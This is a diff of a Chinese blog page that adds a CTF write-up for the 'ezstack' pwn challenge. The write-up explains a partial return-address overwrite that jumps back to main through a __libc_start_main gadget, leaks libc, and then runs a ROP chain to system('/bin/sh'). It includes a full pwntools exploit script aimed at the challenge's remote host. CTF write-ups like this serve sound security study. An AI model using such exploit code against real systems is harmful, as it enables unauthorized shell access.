@@ -26,10 +26,14 @@
 <meta property="og:site_name" content="Briteny&#39;s Blog">
 <meta property="og:description" content="比赛的复现">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/00000000/image-20250320113610314.png">
+<meta property="og:image" content="http://example.com/00000000/image-20250320113634738.png">
+<meta property="og:image" content="http://example.com/00000000/image-20250320113757543.png">
 <meta property="article:published_time" content="2025-03-17T08:09:00.000Z">
-<meta property="article:modified_time" content="2025-03-18T01:44:48.286Z">
+<meta property="article:modified_time" content="2025-03-20T07:11:01.129Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/00000000/image-20250320113610314.png">
   
   
   
@@ -222,7 +226,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          77 字
+          465 字
         
       </span>
     
@@ -233,7 +237,7 @@
         
         
         
-          1 分钟
+          4 分钟
         
       </span>
     
@@ -280,6 +284,15 @@
 <p>⽐较少⻅的⼀个题型，不过并不难，</p>
 <p>ida64查看代码发现只有⼀个read和printf打印我们输⼊的东西 这⾥是没办法通过rop链去泄露libc地址的。</p>
 <p> 程序原设定的返回地址是</p>
+<p><img src="/../00000000/image-20250320113610314.png" srcset="/img/loading.gif" lazyload alt="image-20250320113610314"></p>
+<p>⽽我们需要利⽤的正是__libc_start_main⾥⾯的⼀段gadget 我们将libc⽂件拖⼊ida，分析__libc_start_main段上的汇编</p>
+<p><img src="/../00000000/image-20250320113634738.png" srcset="/img/loading.gif" lazyload alt="image-20250320113634738"></p>
+<p>程序原返回地址是24083这⾥，我们发现在该地址上⾯还有⼀段call rax，⽽此时rax恰好被赋值为了main函数起始地址，也就是说 我们将返回地址修改为mov rax这⾥就可以再次返回到main函数，并且由于printf函数会打印我们输⼊的东西，我们还可以把返回地 址给打印出来，这样我们就拿到了libc地址，以及第⼆次利⽤read函数，接下来就是直接打rop链获得权限。</p>
+<p><img src="/../00000000/image-20250320113757543.png" srcset="/img/loading.gif" lazyload alt="image-20250320113757543"></p>
+<p>调试之后发现确实会回到main函数</p>
+<p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import*<br>from struct import pack<br>import ctypes<br>context(log_level = &#x27;debug&#x27;,arch = &#x27;amd64&#x27;)<br>#p=process(&#x27;./ezstack&#x27;)<br>p=remote(&#x27;27.25.151.12&#x27;,28909)<br>elf=ELF(&#x27;./ezstack&#x27;)<br>#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc.so.6&#x27;)<br>libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6&#x27;)<br>def bug():<br>	gdb.attach(p)<br>	pause()<br>def s(a):<br>	p.send(a)<br>def sa(a,b):<br>	p.sendafter(a,b)<br>def sl(a):<br>	p.sendline(a)<br>def sla(a,b):<br>	p.sendlineafter(a,b)<br>def r(a):<br>	p.recv(a)<br>def pr(a):<br>	print(p.recv(a))<br>def rl(a):<br>	return p.recvuntil(a)<br>def inter():<br>	p.interactive()<br>def get_addr64():<br>	return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>def get_addr32():<br>	return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])<br>def get_sb():<br>	return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()<br>li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)<br>ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)<br>#bug()<br>s(b&#x27;a&#x27;*0x28+b&#x27;\x7c&#x27;)<br>libc_base=get_addr64()-147580<br>li(hex(libc_base))<br>system,bin=get_sb()<br>rdi=libc_base+0x0000000000023b6a<br>pay=b&#x27;a&#x27;*0x28+p64(rdi)+p64(bin)+p64(rdi+1)+p64(system)<br>s(pay)<br>inter()<br></code></pre></td></tr></table></figure>
+
 
                 
               </div>
